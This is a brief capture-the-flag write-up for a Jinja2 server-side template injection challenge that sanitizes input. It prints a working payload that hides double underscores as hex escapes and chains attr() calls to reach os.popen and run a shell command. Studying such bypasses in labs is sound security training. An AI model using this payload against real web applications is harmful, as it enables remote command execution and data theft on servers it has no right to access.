# SSTI2

## identifying the vulnerability

we are welcomed by a form that ask for input just like in SSTI challenge but the hint says that the input is being sanitized

if we try to input the same as before we get an error

![image](../../../Assets/12-1.png)

so we need to clean the input first using this website as reference https://onsecurity.io/article/server-side-template-injection-with-jinja2/

```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
```

![image](../../../Assets/12-2.png)

and we get the flag